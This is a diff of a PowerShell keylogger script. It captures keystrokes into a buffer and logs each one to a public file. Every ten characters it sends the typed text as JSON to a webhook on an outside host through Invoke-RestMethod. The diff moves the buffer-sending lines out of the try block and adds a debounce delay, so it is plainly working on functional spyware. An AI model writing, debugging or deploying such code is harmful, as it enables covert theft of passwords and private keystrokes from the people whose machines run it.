@@ -33,9 +33,9 @@ while ($true) {
             $buffer += $char
             "Added '$char' ($key) to buffer: '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
             if ($buffer.Length -ge 10) {
+                $sendBuffer = $buffer.Substring(0, 10)
+                "Sending '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                 try {
-                    $sendBuffer = $buffer.Substring(0, 10)
-                    "Sending '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                     $payload = @{ content = "Typed: $sendBuffer" } | ConvertTo-Json
                     Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
                     "Sent '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
@@ -45,7 +45,8 @@ while ($true) {
                     $buffer = ""
                 }
             }
-            break  # Exit loop after first keypress to avoid duplicates
+            Start-Sleep -Milliseconds 100  # Debounce to avoid duplicates
+            break
         }
     }
 }
